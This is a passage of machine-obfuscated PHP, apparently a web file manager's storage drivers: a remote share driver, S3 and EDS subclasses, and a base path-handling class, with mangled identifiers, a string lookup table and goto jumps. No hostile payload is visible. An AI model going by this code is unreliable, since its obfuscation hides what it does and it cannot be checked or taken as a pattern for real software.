$‚Ü¨ÍÒÊ[$ÇÅˆÈØ—[42]] = get_path_this($¹„§Öš’); $‚Ü¨ÍÒÊ[$ÇÅˆÈØ—[97]] = $this->pathApiEncode(get_path_father($¹„§Öš’)); if ($Çôø–¦) { $‚Ü¨ÍÒÊ[$ÇÅˆÈØ—[1576]] = $Çôø–¦; } if ($ÙÕ¼“ÖÏ) { $‚Ü¨ÍÒÊ[$ÇÅˆÈØ—[240]] = $ÇÅˆÈØ—[1394] . $ÙÕ¼“ÖÏ; } return $this->requestSend($ÇÅˆÈØ—[1566], $‚Ü¨ÍÒÊ); } protected function pathApiEncode($íŠ­¿ô) { $İ™É¨µ´ =& $_SERVER[øşô´çË]; $áö¥Úó• = $this->_config[$İ™É¨µ´[1549]]; $ıªÉ¦Ù = strlen($áö¥Úó•); if (substr($íŠ­¿ô, 0, $ıªÉ¦Ù) == $áö¥Úó•) { return $íŠ­¿ô; } return $áö¥Úó• . ltrim($íŠ­¿ô, $İ™É¨µ´[8]); } protected function pathApiDecode($¬’åçŠ”) { $Œ»‡´ñ” =& $_SERVER[øşô´çË]; $ï›Ìæ¤¨ = $this->_config[$Œ»‡´ñ”[1549]]; $ûÆºçíå = strlen($ï›Ìæ¤¨); if (substr($¬’åçŠ”, 0, $ûÆºçíå) !== $ï›Ìæ¤¨) { return $¬’åçŠ”; } return $this->_config[$Œ»‡´ñ”[1353]] . ltrim(substr($¬’åçŠ”, $ûÆºçíå), $Œ»‡´ñ”[8]); } private function pathInfoParse(&$¸ø×ºàÑ) { $“ÎŠ¸§ =& $_SERVER[øşô´çË]; $¬óîÁùÁ = $this->_config; $ş¯ã‡±¶ = $¬óîÁùÁ[$“ÎŠ¸§[585]]; if (!$¸ø×ºàÑ || !is_array($¸ø×ºàÑ)) { return $¸ø×ºàÑ; } static $­ª¡–¼ı = array(); $åŞÑĞ°Û = $­ª¡–¼ı[$ş¯ã‡±¶[$“ÎŠ¸§[696]]]; if (!is_array($åŞÑĞ°Û)) { $ØÒ¤–‘š = LNG($“ÎŠ¸§[1577]); $Õ¨©ÖŒ— = $¬óîÁùÁ[$“ÎŠ¸§[589]][$“ÎŠ¸§[100]]; $„Á§¼»Ë = parse_url($¬óîÁùÁ[$“ÎŠ¸§[589]][$“ÎŠ¸§[1578]]); $òî‡ÃàÀ = $¬óîÁùÁ[$“ÎŠ¸§[589]][$“ÎŠ¸§[1579]]; $åŞÑĞ°Û = array($“ÎŠ¸§[1580] => $Õ¨©ÖŒ—[$“ÎŠ¸§[42]] . $“ÎŠ¸§[1061] . $òî‡ÃàÀ . $“ÎŠ¸§[1394] . $„Á§¼»Ë[$“ÎŠ¸§[216]] . $“ÎŠ¸§[1063], $“ÎŠ¸§[1581] => $ØÒ¤–‘š . $“ÎŠ¸§[1130] . $¬óîÁùÁ[$“ÎŠ¸§[589]][$“ÎŠ¸§[1578]] . $“ÎŠ¸§[1582] . LNG($“ÎŠ¸§[1583]) . $“ÎŠ¸§[1130] . $òî‡ÃàÀ, $“ÎŠ¸§[1584] => LNG($“ÎŠ¸§[1585]) . $“ÎŠ¸§[1586] . $¬óîÁùÁ[$“ÎŠ¸§[589]][$“ÎŠ¸§[1578]] . $“ÎŠ¸§[19] . LNG($“ÎŠ¸§[1587]) . $“ÎŠ¸§[1586] . $Õ¨©ÖŒ—[$“ÎŠ¸§[611]], $“ÎŠ¸§[1579] => array($“ÎŠ¸§[42] => $òî‡ÃàÀ, $“ÎŠ¸§[1588] => $“ÎŠ¸§[1589]), $“ÎŠ¸§[1590] => Action($“ÎŠ¸§[1536])->shareTargetMake($ş¯ã‡±¶[$“ÎŠ¸§[1546]])); $­ª¡–¼ı[$ş¯ã‡±¶[$“ÎŠ¸§[696]]] = $åŞÑĞ°Û; } unset($¸ø×ºàÑ[$“ÎŠ¸§[201]]); unset($¸ø×ºàÑ[$“ÎŠ¸§[613]]); unset($¸ø×ºàÑ[$“ÎŠ¸§[198]]); unset($¸ø×ºàÑ[$“ÎŠ¸§[598]]); $¸ø×ºàÑ[$“ÎŠ¸§[1591]] = !0; $¸ø×ºàÑ[$“ÎŠ¸§[242]] = $¬óîÁùÁ[$“ÎŠ¸§[1553]]; $¸ø×ºàÑ[$“ÎŠ¸§[243]] = $¬óîÁùÁ[$“ÎŠ¸§[1554]]; $¸ø×ºàÑ[$“ÎŠ¸§[511]] = $¬óîÁùÁ[$“ÎŠ¸§[1551]]; $¸ø×ºàÑ[$“ÎŠ¸§[1579]] = $åŞÑĞ°Û[$“ÎŠ¸§[1579]]; $¸ø×ºàÑ[$“ÎŠ¸§[1592]] = $ş¯ã‡±¶[$“ÎŠ¸§[241]]; $¸ø×ºàÑ[$“ÎŠ¸§[1593]] = $ş¯ã‡±¶[$“ÎŠ¸§[98]]; $¸ø×ºàÑ[$“ÎŠ¸§[1594]] = $åŞÑĞ°Û[$“ÎŠ¸§[1584]]; $¸ø×ºàÑ[$“ÎŠ¸§[1590]] = $åŞÑĞ°Û[$“ÎŠ¸§[1590]]; $¸ø×ºàÑ[$“ÎŠ¸§[696]] = $ş¯ã‡±¶[$“ÎŠ¸§[696]]; $ñÏô«‚ = explode($“ÎŠ¸§[8], trim($¸ø×ºàÑ[$“ÎŠ¸§[611]], $“ÎŠ¸§[8])); $ñÏô«‚[0] = $åŞÑĞ°Û[$“ÎŠ¸§[1580]]; $¸ø×ºàÑ[$“ÎŠ¸§[611]] = implode($“ÎŠ¸§[8], $ñÏô«‚); if (count($ñÏô«‚) > 1) { unset($¸ø×ºàÑ[$“ÎŠ¸§[1590]]); } if (count($ñÏô«‚) == 1) { if ($¸ø×ºàÑ[$“ÎŠ¸§[43]] == $“ÎŠ¸§[88]) { $¸ø×ºàÑ[$“ÎŠ¸§[42]] = $åŞÑĞ°Û[$“ÎŠ¸§[1580]]; } array_set_value($¸ø×ºàÑ, $“ÎŠ¸§[1595], $åŞÑĞ°Û[$“ÎŠ¸§[1581]]); } $—¼üèİ‡ = array($“ÎŠ¸§[1596], $“ÎŠ¸§[1516], $“ÎŠ¸§[1597], $“ÎŠ¸§[1598]); foreach ($—¼üèİ‡ as $ÀÑ‡•Üï) { $ÎñÕÒß° = $this->urlAuto(_get($¸ø×ºàÑ, $ÀÑ‡•Üï, $“ÎŠ¸§[12])); if ($ÎñÕÒß°) { array_set_value($¸ø×ºàÑ, $ÀÑ‡•Üï, $ÎñÕÒß°); } } } private function _info($Å¤áü, $Î—ñÅçë = false) { $ÄËº¬Õª =& $_SERVER[øşô´çË]; $è¡¤â‚‚ = $this->_config; if (!$è¡¤â‚‚) { return !1; } static $¸¦ü–¾ = array(); if (isset($¸¦ü–¾[$Å¤áü]) && is_array($¸¦ü–¾[$Å¤áü])) { return $¸¦ü–¾[$Å¤áü]; } if ((!$Å¤áü || !trim($Å¤áü, $ÄËº¬Õª[8])) && !$Î—ñÅçë) { $®”³Øù§ = $è¡¤â‚‚[$ÄËº¬Õª[589]][$ÄËº¬Õª[100]]; if (!$®”³Øù§) { return !1; } $®”³Øù§[$ÄËº¬Õª[611]] = $ÄËº¬Õª[12]; $®”³Øù§[$ÄËº¬Õª[97]] = $è¡¤â‚‚[$ÄËº¬Õª[1353]]; $this->pathInfoParse($®”³Øù§); return $®”³Øù§; } $ƒÙöÙš™ = $this->request($ÄËº¬Õª[1599], array($Å¤áü, $Î—ñÅçë)); $¸¦ü–¾[$Å¤áü] = $ƒÙöÙš™; return $ƒÙöÙš™; } private function _fileSubstr($ı—œƒ×‰, $…¤×åÏ— = 0, $É·ÇÃºá = -1) { $Ìø‡´Îü =& $_SERVER[øşô´çË]; $¸­çïì¯ = $this->_fileLink($ı—œƒ×‰); if (!$¸­çïì¯) { return !1; } $Ñ¥åôÔÈ = !1; if ($É·ÇÃºá > 0) { $ª¥Ò‘şÍ = $‡½ãÑÈÑ + $É·ÇÃºá - 1; $Ñ¥åôÔÈ = array($Ìø‡´Îü[1600] . $‡½ãÑÈÑ . $Ìø‡´Îü[485] . $ª¥Ò‘şÍ); } $ã¨´¬§• = url_request($¸­çïì¯, $Ìø‡´Îü[1601], !1, $Ñ¥åôÔÈ); return $ã¨´¬§•[$Ìø‡´Îü[852]] ? $ã¨´¬§•[$Ìø‡´Îü[1388]] : !1; } private function _download($®ş¯ÉÅ«, $ÉÁ™—İ ) { $¯«ÃŠûû = $this->_fileLink($®ş¯ÉÅ«); if (!$¯«ÃŠûû) { return !1; } Downloader::start($¯«ÃŠûû, $ÉÁ™—İ ); return $ÉÁ™—İ ; } private function _fileLink($õ—“«¾, $È¿üã¹Ú = '') { $ÃÅ¡õŸ  =& $_SERVER[øşô´çË]; $¾šßµ¡ = $this->pathApiEncode($õ—“«¾); return $this->requestMakeUrl($ÃÅ¡õŸ [1602], array($ÃÅ¡õŸ [97] => $¾šßµ¡)) . $È¿üã¹Ú; } private function urlAuto($÷©šõ¿Ö) { $†¾êÖ“ğ =& $_SERVER[øşô´çË]; if (!$÷©šõ¿Ö) { return $÷©šõ¿Ö; } $ï£…®•š = parse_url($÷©šõ¿Ö); $êåâçÔä = $÷©šõ¿Ö; if ($this->_config[$†¾êÖ“ğ[1552]] && $ï£…®•š[$†¾êÖ“ğ[215]] == $†¾êÖ“ğ[159] && Input::check($ï£…®•š[$†¾êÖ“ğ[1603]], $†¾êÖ“ğ[1604])) { $÷©šõ¿Ö = $†¾êÖ“ğ[227] . substr($÷©šõ¿Ö, 7); } $á¨­å‚ô = $†¾êÖ“ğ[1605] . rawurlencode(rtrim($this->config[$†¾êÖ“ğ[1549]], $†¾êÖ“ğ[8])); if (strstr($÷©šõ¿Ö, $á¨­å‚ô)) { $ŠŸƒ€ÀÕ = strstr($÷©šõ¿Ö, $†¾êÖ“ğ[86]) ? $†¾êÖ“ğ[294] : $†¾êÖ“ğ[86]; $÷©šõ¿Ö = $÷©šõ¿Ö . $ŠŸƒ€ÀÕ . $†¾êÖ“ğ[1606] . $this->authToken; } return $÷©šõ¿Ö; } private function request($©¦Å“î˜, $÷¶‡ùı) { $â§°ÓÏà =& $_SERVER[øşô´çË]; if (!is_array($÷¶‡ùı)) { $÷¶‡ùı = array(); } for ($Ìæ®êÄ = 0; $Ìæ®êÄ < 4; $Ìæ®êÄ++) { if (!isset($÷¶‡ùı[$Ìæ®êÄ])) { $÷¶‡ùı[$Ìæ®êÄ] = $â§°ÓÏà[12]; } } $Ÿ‡ØÙëó = array($â§°ÓÏà[1599] => array($â§°ÓÏà[1607] => $â§°ÓÏà[1599], $â§°ÓÏà[1608] => $â§°ÓÏà[1609], $â§°ÓÏà[1610] => $â§°ÓÏà[97], $â§°ÓÏà[1352] => array($â§°ÓÏà[1611] => array(array($â§°ÓÏà[97] => $÷¶‡ùı[0])), $â§°ÓÏà[1612] => $÷¶‡ùı[1] ? $â§°ÓÏà[101] : $â§°ÓÏà[12])), $â§°ÓÏà[1561] => array($â§°ÓÏà[1607] => $â§°ÓÏà[1613], $â§°ÓÏà[1608] => $â§°ÓÏà[97], $â§°ÓÏà[1610] => $â§°ÓÏà[1614], $â§°ÓÏà[1352] => array($â§°ÓÏà[97] => $÷¶‡ùı[0], $â§°ÓÏà[437] => _get($GLOBALS[$â§°ÓÏà[7]], $â§°ÓÏà[437], $â§°ÓÏà[101]), $â§°ÓÏà[448] => _get($GLOBALS[$â§°ÓÏà[7]], $â§°ÓÏà[448], $â§°ÓÏà[1615]))), $â§°ÓÏà[1616] => array($â§°ÓÏà[1607] => $â§°ÓÏà[1617], $â§°ÓÏà[1608] => $â§°ÓÏà[97], $â§°ÓÏà[1610] => $â§°ÓÏà[1618], $â§°ÓÏà[1352] => array($â§°ÓÏà[97] => $÷¶‡ùı[0])), $â§°ÓÏà[1562] => array($â§°ÓÏà[1607] => $â§°ÓÏà[1619], $â§°ÓÏà[1608] => $â§°ÓÏà[97], $â§°ÓÏà[1620] => $â§°ÓÏà[1621], $â§°ÓÏà[1352] => array($â§°ÓÏà[97] => $÷¶‡ùı[0], $â§°ÓÏà[178] => $÷¶‡ùı[1])), $â§°ÓÏà[1538] => array($â§°ÓÏà[1607] => $â§°ÓÏà[1538], $â§°ÓÏà[1608] => $â§°ÓÏà[97], $â§°ÓÏà[1620] => $â§°ÓÏà[604], $â§°ÓÏà[1352] => array($â§°ÓÏà[97] => $÷¶‡ùı[0], $â§°ÓÏà[178] => $÷¶‡ùı[1], $â§°ÓÏà[1576] => $÷¶‡ùı[2])), $â§°ÓÏà[1539] => array($â§°ÓÏà[1607] => $â§°ÓÏà[1539], $â§°ÓÏà[1608] => $â§°ÓÏà[97], $â§°ÓÏà[1620] => $â§°ÓÏà[604], $â§°ÓÏà[1352] => array($â§°ÓÏà[97] => $÷¶‡ùı[0], $â§°ÓÏà[1576] => $÷¶‡ùı[2])), $â§°ÓÏà[650] => array($â§°ÓÏà[1607] => $â§°ÓÏà[1622], $â§°ÓÏà[1608] => $â§°ÓÏà[1623], $â§°ÓÏà[1620] => $â§°ÓÏà[1624], $â§°ÓÏà[1352] => array($â§°ÓÏà[1611] => array(array($â§°ÓÏà[97] => $÷¶‡ùı[0])), $â§°ÓÏà[97] => $÷¶‡ùı[1], $â§°ÓÏà[1576] => $÷¶‡ùı[2])), $â§°ÓÏà[652] => array($â§°ÓÏà[1607] => $â§°ÓÏà[1625], $â§°ÓÏà[1608] => $â§°ÓÏà[1623], $â§°ÓÏà[1620] => $â§°ÓÏà[1624], $â§°ÓÏà[1352] => array($â§°ÓÏà[1611] => array(array($â§°ÓÏà[97] => $÷¶‡ùı[0])), $â§°ÓÏà[97] => $÷¶‡ùı[1], $â§°ÓÏà[1576] => $÷¶‡ùı[2])), $â§°ÓÏà[1330] => array($â§°ÓÏà[1607] => $â§°ÓÏà[1626], $â§°ÓÏà[1608] => $â§°ÓÏà[1609], $â§°ÓÏà[1610] => $â§°ÓÏà[97], $â§°ÓÏà[1352] => array($â§°ÓÏà[1611] => array(array($â§°ÓÏà[97] => $÷¶‡ùı[0])))), $â§°ÓÏà[1542] => array($â§°ÓÏà[1607] => $â§°ÓÏà[1627], $â§°ÓÏà[1608] => $â§°ÓÏà[97], $â§°ÓÏà[1620] => $â§°ÓÏà[604], $â§°ÓÏà[1352] => array($â§°ÓÏà[97] => $÷¶‡ùı[0], $â§°ÓÏà[1628] => $÷¶‡ùı[1])), $â§°ÓÏà[117] => array($â§°ÓÏà[1607] => $â§°ÓÏà[1566], $â§°ÓÏà[1608] => $â§°ÓÏà[97], $â§°ÓÏà[1620] => $â§°ÓÏà[604], $â§°ÓÏà[1352] => array($â§°ÓÏà[97] => get_path_father($÷¶‡ùı[0]), $â§°ÓÏà[240] => $÷¶‡ùı[1] ? $â§°ÓÏà[1394] . $÷¶‡ùı[1] : $â§°ÓÏà[12], $â§°ÓÏà[42] => get_path_this($÷¶‡ùı[0]), $â§°ÓÏà[1576] => $÷¶‡ùı[2]))); $Àü¸Ş­Í = $Ÿ‡ØÙëó[$©¦Å“î˜]; if (!$Àü¸Ş­Í) { return !1; } $»ôûÓ•Ÿ = $Àü¸Ş­Í[$â§°ÓÏà[1352]]; $Äùêœã© = explode($â§°ÓÏà[60], $Àü¸Ş­Í[$â§°ÓÏà[1608]]); foreach ($Äùêœã© as $§õâ É) { $íØÅÜŞŞ = $this->pathApiEncode(_get($»ôûÓ•Ÿ, $§õâ É)); array_set_value($»ôûÓ•Ÿ, $§õâ É, $íØÅÜŞŞ); } if ($©¦Å“î˜ == $â§°ÓÏà[1542] && trim($Àü¸Ş­Í[$â§°ÓÏà[1352]][$â§°ÓÏà[97]], $â§°ÓÏà[8]) == trim($this->_config[$â§°ÓÏà[1353]], $â§°ÓÏà[8])) { return $Àü¸Ş­Í[$â§°ÓÏà[1352]][$â§°ÓÏà[97]]; } $²üœ‚€ = $this->requestSend($Àü¸Ş­Í[$â§°ÓÏà[1607]], $»ôûÓ•Ÿ); if (!$²üœ‚€) { return !1; } $µ—Ğ¦ç = $²üœ‚€[$â§°ÓÏà[1388]]; if ($Àü¸Ş­Í[$â§°ÓÏà[1620]]) { $µ—Ğ¦ç = _get($²üœ‚€, $Àü¸Ş­Í[$â§°ÓÏà[1620]]); } if (is_string($µ—Ğ¦ç) && !$Àü¸Ş­Í[$â§°ÓÏà[1610]]) { return $this->pathApiDecode($µ—Ğ¦ç); } if (!is_array($µ—Ğ¦ç) || !$µ—Ğ¦ç) { return $µ—Ğ¦ç; } $¶¸â«è = explode($â§°ÓÏà[60], $Àü¸Ş­Í[$â§°ÓÏà[1610]]); foreach ($¶¸â«è as $§õâ É) { $…¨¥‚Á³ = explode($â§°ÓÏà[10], $§õâ É); $ÊšŒ‡ = array_search($â§°ÓÏà[1629], $…¨¥‚Á³); if ($ÊšŒ‡ === !1) { $íØÅÜŞŞ = $this->pathApiDecode(_get($µ—Ğ¦ç, $§õâ É)); array_set_value($µ—Ğ¦ç, $§õâ É, $íØÅÜŞŞ); if ($©¦Å“î˜ == $â§°ÓÏà[1599] && $§õâ É == $â§°ÓÏà[97]) { $this->pathInfoParse($µ—Ğ¦ç); } if ($©¦Å“î˜ == $â§°ÓÏà[1561] && $§õâ É == $â§°ÓÏà[1630]) { $this->pathInfoParse($µ—Ğ¦ç[$â§°ÓÏà[969]]); } if ($©¦Å“î˜ == $â§°ÓÏà[1561]) { $µ—Ğ¦ç[$â§°ÓÏà[1631]] = array(); } continue; } $¢Ã‰ú¤† = implode($â§°ÓÏà[10], array_slice($…¨¥‚Á³, $ÊšŒ‡ + 1)); $şÄ¿ñËÖ = array(); if ($ÊšŒ‡ === 0) { $şÄ¿ñËÖ =& $µ—Ğ¦ç; } if ($ÊšŒ‡ === 1) { $şÄ¿ñËÖ =& $µ—Ğ¦ç[$…¨¥‚Á³[0]]; } if ($ÊšŒ‡ === 2) { $şÄ¿ñËÖ =& $µ—Ğ¦ç[$…¨¥‚Á³[0]][$…¨¥‚Á³[1]]; } foreach ($şÄ¿ñËÖ as $§õâ É => $û¾Ö¡úŠ) { $íØÅÜŞŞ = $this->pathApiDecode(_get($û¾Ö¡úŠ, $¢Ã‰ú¤†)); array_set_value($şÄ¿ñËÖ[$§õâ É], $¢Ã‰ú¤†, $íØÅÜŞŞ); $this->pathInfoParse($şÄ¿ñËÖ[$§õâ É]); } unset($şÄ¿ñËÖ); } return $µ—Ğ¦ç; } private function requestMakeUrl($ÁÃŞš, $ÛÂÃîÓ˜ = '') { $µÊÊè’ñ =& $_SERVER[øşô´çË]; $ºĞìõÊ = $this->_config; if (!$this->authToken) { return !1; } $Ÿá¢Ğø = $this->requestQuery($ÛÂÃîÓ˜, !0) . $µÊÊè’ñ[1632] . $this->authToken; $¼¥áÍËŞ = rtrim($ºĞìõÊ[$µÊÊè’ñ[589]][$µÊÊè’ñ[1578]], $µÊÊè’ñ[8]) . $µÊÊè’ñ[1633] . $ÁÃŞš; return $¼¥áÍËŞ . $µÊÊè’ñ[1634] . rawurlencode($ºĞìõÊ[$µÊÊè’ñ[589]][$µÊÊè’ñ[1550]]) . $Ÿá¢Ğø; } private function requestAuthToken() { $´ôÛ¨ë¼ =& $_SERVER[øşô´çË]; $Êº§š“Â = $this->_config; if (!$Êº§š“Â) { return !1; } $™ø‡èÕ‹ = _get($Êº§š“Â, $´ôÛ¨ë¼[1635]); $¡ÖÕ´ú· = array_find_by_field($Êº§š“Â[$´ôÛ¨ë¼[589]][$´ôÛ¨ë¼[1590]], $´ôÛ¨ë¼[1636], $™ø‡èÕ‹); if (!$¡ÖÕ´ú·) { return !1; } $Á«¾ï® = $¡ÖÕ´ú·[$´ôÛ¨ë¼[1637]] . $´ôÛ¨ë¼[1638] . $¡ÖÕ´ú·[$´ôÛ¨ë¼[1343]]; $ïü¸ = $´ôÛ¨ë¼[1639] . $this->pathParse[$´ôÛ¨ë¼[496]] . $´ôÛ¨ë¼[485] . $Á«¾ï®; $‰Ù½ƒ” = Cache::get($ïü¸); if ($‰Ù½ƒ”) { return $‰Ù½ƒ”; } $‰Ù½ƒ” = Mcrypt::encode($Á«¾ï®, $´ôÛ¨ë¼[1640]); Cache::set($ïü¸, $‰Ù½ƒ”, 3600 * 24 * 60); return $‰Ù½ƒ”; } private function requestQuery($¯Š¼‡ïÍ = '', $ÃÕ¾õÅ¬ = false) { if (!$¯Š¼‡ïÍ || !is_array($¯Š¼‡ïÍ)) { return $¯Š¼‡ïÍ; } foreach ($¯Š¼‡ïÍ as $ÍÅÅñ¯ => $¹Å›€»Š) { if (is_array($¹Å›€»Š)) { $¯Š¼‡ïÍ[$ÍÅÅñ¯] = json_encode($¹Å›€»Š); } } return $ÃÕ¾õÅ¬ ? $_SERVER[øşô´çË][294] . http_build_query($¯Š¼‡ïÍ) : $¯Š¼‡ïÍ; } private function requestSend($š˜ÖÑ²ƒ, $ëË“®áá) { $¦‹ŠÏª =& $_SERVER[øşô´çË]; $ÃŠºÕï´ = $this->requestMakeUrl($š˜ÖÑ²ƒ); if (!$ÃŠºÕï´) { return !1; } $ä‰şıœ  = url_request($ÃŠºÕï´, $¦‹ŠÏª[297], $this->requestQuery($ëË“®áá), !1, !1, !0); $¾¡Ï˜ÁË = $ä‰şıœ [$¦‹ŠÏª[1388]]; if (!is_array($¾¡Ï˜ÁË) || !$¾¡Ï˜ÁË || !$¾¡Ï˜ÁË[$¦‹ŠÏª[1398]] || intval($¾¡Ï˜ÁË[$¦‹ŠÏª[1398]]) > 500) { $ı°ğŒİ‰ = is_array($¾¡Ï˜ÁË) ? $¾¡Ï˜ÁË[$¦‹ŠÏª[1388]] : $¾¡Ï˜ÁË . $¦‹ŠÏª[12]; if (!$ä‰şıœ [$¦‹ŠÏª[852]]) { $ı°ğŒİ‰ .= $¦‹ŠÏª[1641] . $ä‰şıœ [$¦‹ŠÏª[1398]] . $¦‹ŠÏª[185]; } IO::errorTips($ı°ğŒİ‰, !1); return !1; } return $¾¡Ï˜ÁË; } } class PathDriverEDS extends PathDriverBaseS3 { public function __construct($®€•¡ç) { parent::__construct($®€•¡ç); $this->setSignVersion($_SERVER[øşô´çË][257]); } } goto E½‚×ˆä¤¤; DŠ¡ÇÈßì: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($û€ùÂû—) { $à®ÄÑ‡¯ =& $_SERVER[øşô´çË]; parent::__construct($û€ùÂû—); $‡€Å”ÓÈ = isset($û€ùÂû—[$à®ÄÑ‡¯[266]]) && $û€ùÂû—[$à®ÄÑ‡¯[266]] == $à®ÄÑ‡¯[257] ? $à®ÄÑ‡¯[257] : $à®ÄÑ‡¯[322]; $this->setSignVersion($‡€Å”ÓÈ); } public function link($ÅÆ‡½ŞÓ, $ƒò´øÔ¿ = array()) { return parent::link($ÅÆ‡½ŞÓ, $ƒò´øÔ¿); } public function fileOut($ö¡Œëƒâ, $ã÷¾’Áî = false, $¬×ù¶Øã = false, $’‰Ÿ®êÀ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[øşô´çË][323])) { return parent::fileOutServer($ö¡Œëƒâ, $ã÷¾’Áî, $¬×ù¶Øã, $’‰Ÿ®êÀ); } parent::fileOut($ö¡Œëƒâ, $ã÷¾’Áî, $¬×ù¶Øã, $’‰Ÿ®êÀ); } public function fileOutImage($ŸËš¼ùí, $¿©­§šÆ = 250) { if (strstr($this->endpoint, $_SERVER[øşô´çË][323])) { return parent::fileOutImageServer($ŸËš¼ùí, $¿©­§šÆ); } parent::fileOutImage($ŸËš¼ùí, $¿©­§šÆ); } } define($_SERVER[øşô´çË][324], 1); define($_SERVER[øşô´çË][325], 2); goto CËÕœƒ ©Á; fÍ²…°Â¬: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $á›Ä·Ø¼ =& $_SERVER[øşô´çË]; $this->objectDriver = array($á›Ä·Ø¼[70], $á›Ä·Ø¼[71], $á›Ä·Ø¼[72], $á›Ä·Ø¼[73], $á›Ä·Ø¼[74], $á›Ä·Ø¼[75], $á›Ä·Ø¼[76], $á›Ä·Ø¼[77], $á›Ä·Ø¼[78], $á›Ä·Ø¼[79], $á›Ä·Ø¼[80], $á›Ä·Ø¼[81]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($£šô¼¸‘) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($£šô¼¸‘, $_SERVER[øşô´çË][8]); } return $£šô¼¸‘; } public function iconvApp($ŞöÑù‘ü) { return $ŞöÑù‘ü; } public function iconvSystem($Ãş¶¢) { return $Ãş¶¢; } public function iconvTo($úŸ³ Û, $Œ¥…ÄÍ“, $øáÀèáª) { $„ı½‘ı´ =& $_SERVER[øşô´çË]; if (!$úŸ³ Û || !function_exists($„ı½‘ı´[82])) { return $úŸ³ Û; } static $â´í®Ëæ = array(); $¶ïºƒ  = $Œ¥…ÄÍ“ . $„ı½‘ı´[83] . $øáÀèáª . $„ı½‘ı´[84] . $úŸ³ Û; if (isset($â´í®Ëæ[$¶ïºƒ ])) { return $â´í®Ëæ[$¶ïºƒ ]; } if (function_exists($„ı½‘ı´[85])) { $Œ£Šñ˜ä = @mb_convert_encoding($úŸ³ Û, $øáÀèáª, $Œ¥…ÄÍ“); } else { $Œ£Šñ˜ä = @iconv($Œ¥…ÄÍ“, $øáÀèáª, $úŸ³ Û); } $Œ£Šñ˜ä = $Œ£Šñ˜ä ? $Œ£Šñ˜ä : $úŸ³ Û; if (strstr($Œ£Šñ˜ä, $„ı½‘ı´[86])) { $Œ£Šñ˜ä = str_replace($„ı½‘ı´[86], $„ı½‘ı´[11], $Œ£Šñ˜ä); } $â´í®Ëæ[$Œ¥…ÄÍ“ . $„ı½‘ı´[83] . $øáÀèáª . $„ı½‘ı´[84] . $úŸ³ Û] = $Œ£Šñ˜ä; $â´í®Ëæ[$øáÀèáª . $„ı½‘ı´[83] . $Œ¥…ÄÍ“ . $„ı½‘ı´[84] . $úŸ³ Û] = $úŸ³ Û; $â´í®Ëæ[$øáÀèáª . $„ı½‘ı´[83] . $Œ¥…ÄÍ“ . $„ı½‘ı´[84] . $Œ£Šñ˜ä] = $úŸ³ Û; $â´í®Ëæ[$Œ¥…ÄÍ“ . $„ı½‘ı´[83] . $øáÀèáª . $„ı½‘ı´[84] . $Œ£Šñ˜ä] = $Œ£Šñ˜ä; return $Œ£Šñ˜ä; } public function getPathInner($®§´Æ„) { $ãêè„Æ = IO::init($®§´Æ„); return $ãêè„Æ->path; } public function getPathOuter($Œ™¤äÙ®) { $¦½“”ô‰ =& $_SERVER[øşô´çË]; $ôíÜü°œ = strlen(trim($this->pathBase, $¦½“”ô‰[8])); $Œ™¤äÙ® = substr(trim($Œ™¤äÙ®, $¦½“”ô‰[8]), $ôíÜü°œ); return $this->pathDriver . $¦½“”ô‰[8] . ltrim($Œ™¤äÙ®, $¦½“”ô‰[8]); } public function isParentOf($¨¨ÒÁ‹, $É¯âŸ©ç) { $û¯âØï± =& $_SERVER[øşô´çË]; $¨¨ÒÁ‹ = rtrim(strtolower($¨¨ÒÁ‹), $û¯âØï±[8]) . $û¯âØï±[8]; $É¯âŸ©ç = rtrim(strtolower($É¯âŸ©ç), $û¯âØï±[8]) . $û¯âØï±[8]; $¡îÁ²  = strpos($É¯âŸ©ç, $¨¨ÒÁ‹) === 0; return $¡îÁ² ; } public function getType() { $½¡®àèÆ =& $_SERVER[øşô´çË]; $Æ¿©ğúê = str_replace($½¡®àèÆ[87], $½¡®àèÆ[12], get_class($this)); return strtolower($Æ¿©ğúê); } public function isOsDriver() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($ü¬òÀÊø, $é°Ş„ù´) { $¨ ¶™ï­ =& $_SERVER[øşô´çË]; $¸°£à·Š = rtrim($ü¬òÀÊø, $¨ ¶™ï­[8]) . $¨ ¶™ï­[8] . $é°Ş„ù´; $›æî“«ä = $this->exist($¸°£à·Š); return $›æî“«ä ? $¸°£à·Š : !1; } public function setModifyTime($ëøİ°¶‹, $šåµë« = '') { } public function renameObject($Æ¡ü¥´š, $İÓ¥„ƒ) { $¥ÁÌ¾÷ = $İÓ¥„ƒ; $Æ¡ü¥´š = $this->getPathOuter($Æ¡ü¥´š); $İÓ¥„ƒ = $this->pathFather($Æ¡ü¥´š) . $İÓ¥„ƒ; $ÌÊş¶¹¡ = IO::copy($Æ¡ü¥´š, $this->pathFather($Æ¡ü¥´š), REPEAT_RENAME_FOLDER, $¥ÁÌ¾÷); if ($ÌÊş¶¹¡) { IO::remove($Æ¡ü¥´š); } return $ÌÊş¶¹¡ ? $İÓ¥„ƒ : !1; } public function tempFile($Ô—åá­¹ = '', $öô¥Ê‹ = '') { if (!$Ô—åá­¹) { $Ô—åá­¹ = rand_string(15); } $¬Ôì¾¾À = TEMP_FILES . rand_string(15) . $_SERVER[øşô´çË][8]; @mkdir($¬Ôì¾¾À, DEFAULT_PERRMISSIONS, !0); $»¾§´Éò = $¬Ôì¾¾À . $Ô—åá­¹; @touch($»¾§´Éò); if ($öô¥Ê‹) { file_put_contents($»¾§´Éò, $öô¥Ê‹); } return $»¾§´Éò; } public function tempFileRemve($Û“÷Œ¡) { @unlink($Û“÷Œ¡); @rmdir($this->pathFather($Û“÷Œ¡)); } public function mkfile($ïûš°ìÓ, $™ß¤ÎÖå = '', $²üäÓÀ = REPEAT_RENAME) { } public function mkdir($áŞµ€ , $Ä•¢ù = REPEAT_SKIP) { } public function delFile($ú“®²İª) { } public function delFolder($è»¼‰ä) { } public function copyFile($†«î¨¼, $Œ…Œöú¿) { } public function moveFile($¼îÖÊé¶, $¤øùµ›) { } public function remove($î”¬ñ³è) { if ($this->isFile($î”¬ñ³è)) { return $this->delFile($î”¬ñ³è); } return $this->delFolder($î”¬ñ³è); } public function rename($­‰æ–øÆ, 